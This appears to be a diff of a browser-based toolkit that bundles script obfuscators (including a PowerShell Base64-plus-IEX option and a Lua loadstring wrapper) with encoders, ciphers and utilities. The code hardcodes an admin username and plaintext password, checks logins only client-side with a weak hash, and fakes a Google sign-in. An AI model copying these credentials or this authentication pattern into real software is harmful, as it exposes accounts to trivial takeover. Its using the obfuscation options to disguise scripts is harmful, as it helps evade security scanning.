-          <option value="b64">Base64 encode + invoke (IEX)</option>
+          <option value="b64">Base64 encode + invoke (UTF-16LE, IEX)</option>
           <option value="caserand">Case randomisation</option>
           <option value="combo">Combo (tick + case + string split)</option>
         </select>
@@ -785,7 +855,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ BASH OBFUSCATOR ══════════════ -->
+<!-- BASH OBFUSCATOR -->
 <div class="tool-panel" id="bash-obf-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -840,7 +910,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ LUA OBFUSCATOR ══════════════ -->
+<!-- LUA OBFUSCATOR -->
 <div class="tool-panel" id="lua-obf-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -869,7 +939,7 @@ select option { background: var(--bg-2); }
       <div class="opts" id="lua-opts">
         <div class="opt-item checked" data-key="stripComments" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Strip comments</span></div>
         <div class="opt-item checked" data-key="renameLocals" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Rename locals</span></div>
-        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Encode strings (\\ddd)</span></div>
+        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Encode strings (\ddd)</span></div>
         <div class="opt-item checked" data-key="hexNumbers" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Hex number literals</span></div>
         <div class="opt-item" data-key="minify" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Minify whitespace</span></div>
         <div class="opt-item" data-key="loadstring" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">loadstring wrapper</span></div>
@@ -896,7 +966,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ BASE64 ══════════════ -->
+<!-- BASE64 -->
 <div class="tool-panel" id="base64-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -939,7 +1009,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ URL ENCODE ══════════════ -->
+<!-- URL ENCODE -->
 <div class="tool-panel" id="url-enc-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -983,7 +1053,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ HEX ══════════════ -->
+<!-- HEX -->
 <div class="tool-panel" id="hex-enc-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1035,7 +1105,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ HTML ENTITY ══════════════ -->
+<!-- HTML ENTITY -->
 <div class="tool-panel" id="html-enc-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1081,7 +1151,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ XOR ══════════════ -->
+<!-- XOR -->
 <div class="tool-panel" id="xor-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1137,7 +1207,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ ROT ══════════════ -->
+<!-- ROT -->
 <div class="tool-panel" id="rot-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1177,7 +1247,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ CAESAR ══════════════ -->
+<!-- CAESAR -->
 <div class="tool-panel" id="caesar-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1216,7 +1286,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ HASH ══════════════ -->
+<!-- HASH -->
 <div class="tool-panel" id="hash-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1245,7 +1315,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ STRING TOOLS ══════════════ -->
+<!-- STRING TOOLS -->
 <div class="tool-panel" id="string-tools-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1286,7 +1356,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ CHAR CODE ══════════════ -->
+<!-- CHAR CODE -->
 <div class="tool-panel" id="charcode-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1296,7 +1366,7 @@ select option { background: var(--bg-2); }
     </div>
     <div>
       <div class="panel-title">Char Code Converter</div>
-      <div class="panel-desc">Text ↔ decimal char codes · Unicode code points · JS / C# array output</div>
+      <div class="panel-desc">Text ↔ decimal char codes · Unicode code points · JS / C# array output · UTF-8 bytes</div>
     </div>
   </div>
   <div class="card">
@@ -1312,6 +1382,7 @@ select option { background: var(--bg-2); }
         <option value="jsarr">JS array [0x41, 0x48]</option>
         <option value="csharp">C# byte[] {0x41, 0x48}</option>
         <option value="str">String.fromCharCode(…)</option>
+        <option value="utf8">UTF-8 bytes (0xE4 0xBD …)</option>
       </select>
     </div>
     <div class="col-auto row" style="align-items:flex-end;gap:8px;">
@@ -1331,7 +1402,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ TEXT DIFF ══════════════ -->
+<!-- TEXT DIFF -->
 <div class="tool-panel" id="diff-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1370,7 +1441,7 @@ select option { background: var(--bg-2); }
   </div>
 </div>
 
-<!-- ══════════════ REGEX TESTER ══════════════ -->
+<!-- REGEX TESTER -->
 <div class="tool-panel" id="regex-panel">
   <div class="panel-header">
     <div class="panel-icon">
@@ -1415,21 +1486,19 @@ select option { background: var(--bg-2); }
 </div>
 
 </main>
-</div>
+</div><!-- end .shell -->
 
 <script>
-// ═══════════════════════════════════════════════
-// AUTHENTICATION
-// ═══════════════════════════════════════════════
-const AUTH_USERS_KEY = 'archhub_users_v1';
+// ══════════════════════════════════════════
+//  AUTH
+// ══════════════════════════════════════════
+const AUTH_USERS_KEY   = 'archhub_users_v1';
 const AUTH_SESSION_KEY = 'archhub_session_v1';
-
 const ADMIN_USER = 'kevinjia';
-const ADMIN_PASS = 'smw-170121';
+const ADMIN_PASS = 'smw-170121'; // ⚠ change before pushing to a public repo
 
 function simpleHash(str) {
-  let h1 = 0xdeadbeef;
-  let h2 = 0x41c6ce57;
+  let h1 = 0xdeadbeef, h2 = 0x41c6ce57;
   for (let i = 0; i < str.length; i++) {
     const ch = str.charCodeAt(i);
     h1 = Math.imul(h1 ^ ch, 2654435761);
@@ -1440,100 +1509,57 @@ function simpleHash(str) {
   return (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16);
 }
 
-function getUsers() {
-  try { return JSON.parse(localStorage.getItem(AUTH_USERS_KEY)) || {}; }
-  catch { return {}; }
-}
-function setUsers(users) {
-  localStorage.setItem(AUTH_USERS_KEY, JSON.stringify(users));
-}
-function getSession() {
-  try { return JSON.parse(sessionStorage.getItem(AUTH_SESSION_KEY)) || null; }
-  catch { return null; }
-}
-function setSession(s) {
-  sessionStorage.setItem(AUTH_SESSION_KEY, JSON.stringify(s));
-}
-function clearSession() {
-  sessionStorage.removeItem(AUTH_SESSION_KEY);
-}
+function getUsers()   { try { return JSON.parse(localStorage.getItem(AUTH_USERS_KEY)) || {}; } catch { return {}; } }
+function setUsers(u)  { localStorage.setItem(AUTH_USERS_KEY, JSON.stringify(u)); }
+function getSession() { try { return JSON.parse(sessionStorage.getItem(AUTH_SESSION_KEY)) || null; } catch { return null; } }
+function setSession(s){ sessionStorage.setItem(AUTH_SESSION_KEY, JSON.stringify(s)); }
+function clearSession(){ sessionStorage.removeItem(AUTH_SESSION_KEY); }
 
 function ensureAdmin() {
   const users = getUsers();
   if (!users[ADMIN_USER] || users[ADMIN_USER].role !== 'admin') {
-    users[ADMIN_USER] = {
-      password: simpleHash(ADMIN_PASS),
-      role: 'admin',
-      created: Date.now(),
-    };
+    users[ADMIN_USER] = { password: simpleHash(ADMIN_PASS), role: 'admin', created: Date.now() };
     setUsers(users);
   }
 }
 
 function switchAuthTab(tab) {
   document.querySelectorAll('.auth-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
-  document.getElementById('login-form').style.display = tab === 'login' ? '' : 'none';
+  document.getElementById('login-form').style.display    = tab === 'login'    ? '' : 'none';
   document.getElementById('register-form').style.display = tab === 'register' ? '' : 'none';
   document.getElementById('login-error').textContent = '';
-  document.getElementById('reg-error').textContent = '';
+  document.getElementById('reg-error').textContent   = '';
 }
 
 function handleLogin(e) {
   e.preventDefault();
-  const user = document.getElementById('login-user').value.trim();
-  const pass = document.getElementById('login-pass').value;
+  const user  = document.getElementById('login-user').value.trim();
+  const pass  = document.getElementById('login-pass').value;
   const errEl = document.getElementById('login-error');
-  errEl.className = 'auth-error';
-  errEl.textContent = '';
-
-  if (!user || !pass) {
-    errEl.textContent = 'Please enter both username and password.';
-    return;
-  }
-
-  const users = getUsers();
-  const u = users[user];
-  if (!u) {
-    errEl.textContent = 'User not found. Try registering first.';
-    return;
-  }
-  if (u.password !== simpleHash(pass)) {
-    errEl.textContent = 'Incorrect password.';
-    return;
-  }
-
+  errEl.className = 'auth-error'; errEl.textContent = '';
+  if (!user || !pass) { errEl.textContent = 'Please enter both username and password.'; return; }
+  const users = getUsers(), u = users[user];
+  if (!u)                            { errEl.textContent = 'User not found.'; return; }
+  if (u.password !== simpleHash(pass)){ errEl.textContent = 'Incorrect password.'; return; }
   const session = { username: user, role: u.role, loginAt: Date.now() };
-  setSession(session);
-  enterApp(session);
+  setSession(session); enterApp(session);
 }
 
-// 模拟 Google 登录注册
 function handleGoogleLogin() {
   const errEl = document.getElementById('reg-error');
-  errEl.className = 'auth-error';
-  errEl.textContent = 'Authenticating with Google...';
-  
-  // 模拟网络延迟
+  errEl.className = 'auth-error'; errEl.textContent = 'Authenticating with Google...';
   setTimeout(() => {
-    // 随机生成一个 Google 风格的邮箱名
-    const randId = Math.random().toString(36).substring(2, 8);
-    const mockEmail = `user_${randId}@gmail.com`;
-    const username = mockEmail.split('@')[0];
-    
-    const users = getUsers();
-    // 如果用户不存在则创建
+    const randId   = Math.random().toString(36).substring(2, 8);
+    const username = `user_${randId}`;
+    const users    = getUsers();
     if (!users[username]) {
-        users[username] = { password: 'google_oauth_bypass', role: 'user', created: Date.now() };
-        setUsers(users);
+      users[username] = { password: 'google_oauth_bypass', role: 'user', created: Date.now() };
+      setUsers(users);
     }
-
-    errEl.className = 'auth-error ok';
-    errEl.textContent = 'Success! Signing you in...';
-
+    errEl.className = 'auth-error ok'; errEl.textContent = 'Success! Signing you in...';
     setTimeout(() => {
-        const session = { username: username, role: 'user', loginAt: Date.now() };
-        setSession(session);
-        enterApp(session);
+      const session = { username, role: 'user', loginAt: Date.now() };
+      setSession(session); enterApp(session);
     }, 800);
   }, 1200);
 }
@@ -1541,22 +1567,19 @@ function handleGoogleLogin() {
 function enterApp(session) {
   document.getElementById('auth-screen').classList.add('hidden');
   document.getElementById('app-shell').style.display = '';
-
-  document.getElementById('user-name').textContent = session.username;
+  document.getElementById('user-name').textContent   = session.username;
   document.getElementById('user-avatar').textContent = session.username[0].toUpperCase();
   const roleEl = document.getElementById('user-role');
-  roleEl.textContent = session.role === 'admin' ? 'ADMIN' : 'USER';
-  roleEl.style.background = session.role === 'admin'
-    ? 'rgba(245,158,11,.15)'
-    : 'var(--accent-lo)';
-  roleEl.style.color = session.role === 'admin' ? '#fbbf24' : 'var(--accent-hi)';
-
+  roleEl.textContent    = session.role === 'admin' ? 'ADMIN' : 'USER';
+  roleEl.style.background = session.role === 'admin' ? 'rgba(245,158,11,.15)' : 'var(--accent-lo)';
+  roleEl.style.color      = session.role === 'admin' ? '#fbbf24'              : 'var(--accent-hi)';
   document.getElementById('login-form').reset();
   document.getElementById('login-error').textContent = '';
-  document.getElementById('reg-error').textContent = '';
+  document.getElementById('reg-error').textContent   = '';
   switchAuthTab('login');
-
-  navigate('home');
+  // restore hash route or go home
+  const hash = location.hash.slice(1) || 'home';
+  navigate(hash);
 }
 
 function logout() {
@@ -1565,118 +1588,198 @@ function logout() {
   document.getElementById('auth-screen').classList.remove('hidden');
   document.getElementById('login-form').reset();
   document.getElementById('login-error').textContent = '';
+  history.replaceState(null, '', location.pathname);
 }
 
-// ═══════════════════════════════════════════════
-// NAVIGATION
-// ═══════════════════════════════════════════════
-const TOOLS = [
-  { id:'js-obf',       name:'JS Obfuscator',      cat:'Obfuscator',  icon:'code' },
-  { id:'ps-obf',       name:'PowerShell Obf.',    cat:'Obfuscator',  icon:'term' },
-  { id:'bash-obf',     name:'Bash Obfuscator',    cat:'Obfuscator',  icon:'shell' },
-  { id:'lua-obf',      name:'Lua Obfuscator',     cat:'Obfuscator',  icon:'lua' },
-  { id:'base64',       name:'Base64',             cat:'Encode',      icon:'shield' },
-  { id:'url-enc',      name:'URL Encode',         cat:'Encode',      icon:'globe' },
-  { id:'hex-enc',      name:'Hex',                cat:'Encode',      icon:'hex' },
-  { id:'html-enc',     name:'HTML Entity',        cat:'Encode',      icon:'tag' },
-  { id:'xor',          name:'XOR Cipher',         cat:'Cipher',      icon:'x' },
-  { id:'rot',          name:'ROT13 / ROT-N',      cat:'Cipher',      icon:'rotate' },
-  { id:'caesar',       name:'Caesar Cipher',      cat:'Cipher',      icon:'clock' },
-  { id:'hash',         name:'Hash Generator',     cat:'Hash',        icon:'hash' },
-  { id:'string-tools', name:'String Tools',       cat:'Utility',     icon:'text' },
-  { id:'charcode',     name:'Char Code',          cat:'Utility',     icon:'kb' },
-  { id:'diff',         name:'Text Diff',          cat:'Utility',     icon:'diff' },
-  { id:'regex',        name:'Regex Tester',       cat:'Utility',     icon:'search' },
-];
-
-const ICONS = {
-  code:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/><path d="M10 12l-2 2 2 2"/><path d="M14 12l2 2-2 2"/></svg>`,
-  term:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/><path d="M7 8l3 2-3 2m5 0h3"/></svg>`,
-  shell:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17l6-6-6-6"/><path d="M12 19h8"/></svg>`,
-  lua:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="17" cy="7" r="2" fill="currentColor" stroke="none"/></svg>`,
-  shield:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
-  globe:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>`,
-  hex:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h3m0 0v10m0-10h2a3 3 0 010 6H7m7 0h4m-4 4h4M14 7v10"/></svg>`,
-  tag:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>`,
-  x:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/><circle cx="12" cy="12" r="10"/></svg>`,
-  rotate:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>`,
-  clock:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>`,
-  hash:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>`,
-  text:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>`,
-  kb:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M12 10h.01M18 10h.01M6 14h12"/></svg>`,
-  diff:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>`,
-  search:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>`,
-};
-
-function buildDash() {
-  const g = document.getElementById('dash-grid');
-  g.innerHTML = TOOLS.map(t => `
-    <div class="dash-card" onclick="navigate('${t.id}')">
-      <div class="dash-card-icon">${ICONS[t.icon]||''}</div>
-      <div class="dash-card-name">${t.name}</div>
-      <div class="dash-card-cat">${t.cat}</div>
-    </div>`).join('');
-}
-
+// ══════════════════════════════════════════
+//  NAVIGATION + HASH ROUTING
+// ══════════════════════════════════════════
 function navigate(id) {
   if (!getSession()) { logout(); return; }
-
+  history.replaceState(null, '', '#' + id);
   document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
   const panel = document.getElementById(id + '-panel') || document.getElementById('home-panel');
   panel.classList.add('active');
   document.querySelectorAll('.nav-item').forEach(n => {
-    const oc = n.getAttribute('onclick') || '';
-    if (oc.includes(`'${id}'`)) n.classList.add('active');
+    if ((n.getAttribute('onclick') || '').includes(`'${id}'`)) n.classList.add('active');
   });
   document.getElementById('main-area').scrollTop = 0;
 }
 
-// ═══════════════════════════════════════════════
-// HELPERS
-// ═══════════════════════════════════════════════
-function getOpts(containerId) {
-  const opts = {};
-  document.querySelectorAll(`#${containerId} .opt-item`).forEach(el => {
-    opts[el.dataset.key] = el.classList.contains('checked');
-  });
-  return opts;
+window.addEventListener('popstate', () => {
+  if (getSession()) navigate(location.hash.slice(1) || 'home');
+});
+
+// ══════════════════════════════════════════
+//  TOOL REGISTRY + DASHBOARD
+// ══════════════════════════════════════════
+const TOOLS = [
+  { id:'js-obf',       name:'JS Obfuscator',      cat:'Obfuscator', icon:'code'   },
+  { id:'ps-obf',       name:'PowerShell Obf.',    cat:'Obfuscator', icon:'term'   },
+  { id:'bash-obf',     name:'Bash Obfuscator',    cat:'Obfuscator', icon:'shell'  },
+  { id:'lua-obf',      name:'Lua Obfuscator',     cat:'Obfuscator', icon:'lua'    },
+  { id:'base64',       name:'Base64',             cat:'Encode',     icon:'shield' },
+  { id:'url-enc',      name:'URL Encode',         cat:'Encode',     icon:'globe'  },
+  { id:'hex-enc',      name:'Hex',                cat:'Encode',     icon:'hex'    },
+  { id:'html-enc',     name:'HTML Entity',        cat:'Encode',     icon:'tag'    },
+  { id:'xor',          name:'XOR Cipher',         cat:'Cipher',     icon:'x'      },
+  { id:'rot',          name:'ROT13 / ROT-N',      cat:'Cipher',     icon:'rotate' },
+  { id:'caesar',       name:'Caesar Cipher',      cat:'Cipher',     icon:'clock'  },
+  { id:'hash',         name:'Hash Generator',     cat:'Hash',       icon:'hash'   },
+  { id:'string-tools', name:'String Tools',       cat:'Utility',    icon:'text'   },
+  { id:'charcode',     name:'Char Code',          cat:'Utility',    icon:'kb'     },
+  { id:'diff',         name:'Text Diff',          cat:'Utility',    icon:'diff'   },
+  { id:'regex',        name:'Regex Tester',       cat:'Utility',    icon:'search' },
+];
+
+const ICONS = {
+  code:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/><path d="M10 12l-2 2 2 2"/><path d="M14 12l2 2-2 2"/></svg>`,
+  term:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/><path d="M7 8l3 2-3 2m5 0h3"/></svg>`,
+  shell:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17l6-6-6-6"/><path d="M12 19h8"/></svg>`,
+  lua:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="17" cy="7" r="2" fill="currentColor" stroke="none"/></svg>`,
+  shield: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
+  globe:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>`,
+  hex:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h3m0 0v10m0-10h2a3 3 0 010 6H7m7 0h4m-4 4h4M14 7v10"/></svg>`,
+  tag:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>`,
+  x:      `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/><circle cx="12" cy="12" r="10"/></svg>`,
+  rotate: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>`,
+  clock:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>`,
+  hash:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>`,
+  text:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>`,
+  kb:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M12 10h.01M18 10h.01M6 14h12"/></svg>`,
+  diff:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>`,
+  search: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>`,
+};
+
+function buildDash() {
+  document.getElementById('dash-grid').innerHTML = TOOLS.map(t =>
+    `<div class="dash-card" onclick="navigate('${t.id}')">
+      <div class="dash-card-icon">${ICONS[t.icon] || ''}</div>
+      <div class="dash-card-name">${t.name}</div>
+      <div class="dash-card-cat">${t.cat}</div>
+    </div>`
+  ).join('');
+}
+
+// ══════════════════════════════════════════
+//  COMMAND PALETTE
+// ══════════════════════════════════════════
+let cmdSelected = 0;
+
+function cmdOpen() {
+  document.getElementById('cmd-overlay').classList.add('open');
+  document.getElementById('cmd-search').value = '';
+  cmdFilter();
+  setTimeout(() => document.getElementById('cmd-search').focus(), 50);
+}
+function cmdClose(e) {
+  if (!e || e.target === document.getElementById('cmd-overlay'))
+    document.getElementById('cmd-overlay').classList.remove('open');
+}
+function cmdFilter() {
+  const q    = document.getElementById('cmd-search').value.toLowerCase();
+  const hits = TOOLS.filter(t => t.name.toLowerCase().includes(q) || t.cat.toLowerCase().includes(q));
+  cmdSelected = 0;
+  const el = document.getElementById('cmd-results');
+  if (!hits.length) { el.innerHTML = '<div class="cmd-empty">No tools match.</div>'; return; }
+  el.innerHTML = hits.map((t, i) =>
+    `<div class="cmd-item ${i === 0 ? 'selected' : ''}" data-id="${t.id}"
+       onmouseenter="cmdSelect(${i})" onclick="cmdGo('${t.id}')">
+      ${ICONS[t.icon] ? `<span style="color:var(--accent-hi);display:flex;align-items:center;width:16px;height:16px;">${ICONS[t.icon]}</span>` : ''}
+      ${t.name}
+      <span class="cmd-item-cat">${t.cat}</span>
+    </div>`
+  ).join('');
+}
+function cmdSelect(i) {
+  cmdSelected = i;
+  document.querySelectorAll('.cmd-item').forEach((el, j) => el.classList.toggle('selected', i === j));
+}
+function cmdKey(e) {
+  const items = document.querySelectorAll('.cmd-item');
+  if      (e.key === 'ArrowDown') { cmdSelect(Math.min(cmdSelected + 1, items.length - 1)); e.preventDefault(); }
+  else if (e.key === 'ArrowUp')   { cmdSelect(Math.max(cmdSelected - 1, 0)); e.preventDefault(); }
+  else if (e.key === 'Enter' && items[cmdSelected]) cmdGo(items[cmdSelected].dataset.id);
+  else if (e.key === 'Escape') cmdClose();
+}
+function cmdGo(id) {
+  document.getElementById('cmd-overlay').classList.remove('open');
+  navigate(id);
+}
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    if (getSession()) cmdOpen();
+  }
+  if (e.key === 'Escape' && document.getElementById('cmd-overlay').classList.contains('open')) {
+    cmdClose();
+  }
+});
+
+// ══════════════════════════════════════════
+//  SHARED HELPERS
+// ══════════════════════════════════════════
+function getOpts(cid) {
+  const o = {};
+  document.querySelectorAll(`#${cid} .opt-item`).forEach(el => { o[el.dataset.key] = el.classList.contains('checked'); });
+  return o;
 }
 function toggleOpt(el) { el.classList.toggle('checked'); }
-function clearField(inId, outId) {
-  document.getElementById(inId).value = '';
-  document.getElementById(outId).value = '';
-}
+function clearField(a, b) { document.getElementById(a).value = ''; document.getElementById(b).value = ''; }
+
+// Copy with toast feedback
 function copyOutput(id) {
   const v = document.getElementById(id).value;
   if (!v) return;
   navigator.clipboard.writeText(v).catch(() => {
     const ta = document.getElementById(id); ta.select(); document.execCommand('copy');
   });
+  let toast = document.getElementById('_copy-toast');
+  if (!toast) {
+    toast = document.createElement('div');
+    toast.id = '_copy-toast';
+    toast.style.cssText = [
+      'position:fixed;top:60px;right:20px;z-index:3000',
+      'background:var(--bg-3);border:1px solid var(--border-hi)',
+      'color:var(--ok);font-family:var(--mono);font-size:12px',
+      'padding:8px 14px;border-radius:6px',
+      'box-shadow:0 4px 20px rgba(0,0,0,.4)',
+      'transition:opacity .25s;pointer-events:none;opacity:0'
+    ].join(';');
+    toast.textContent = '✓  copied to clipboard';
+    document.body.appendChild(toast);
+  }
+  clearTimeout(toast._t);
+  toast.style.opacity = '1';
+  toast._t = setTimeout(() => { toast.style.opacity = '0'; }, 1800);
 }
+
 function swapFields(a, b) {
   const va = document.getElementById(a).value, vb = document.getElementById(b).value;
-  document.getElementById(a).value = vb;
-  document.getElementById(b).value = va;
+  document.getElementById(a).value = vb; document.getElementById(b).value = va;
 }
-function downloadText(id, filename) {
-  const val = document.getElementById(id).value;
-  if (!val) return;
+function downloadText(id, fn) {
+  const v = document.getElementById(id).value;
+  if (!v) return;
   const a = document.createElement('a');
-  a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(val);
-  a.download = filename; a.click();
+  a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(v);
+  a.download = fn; a.click();
 }
 function loadSample(id, text) { document.getElementById(id).value = text; }
+
+let _noticeTimers = {};
 function notice(id, type, msg) {
   const el = document.getElementById(id);
   el.className = 'notice ' + type + ' show';
   el.textContent = msg;
-  setTimeout(() => el.classList.remove('show'), 4000);
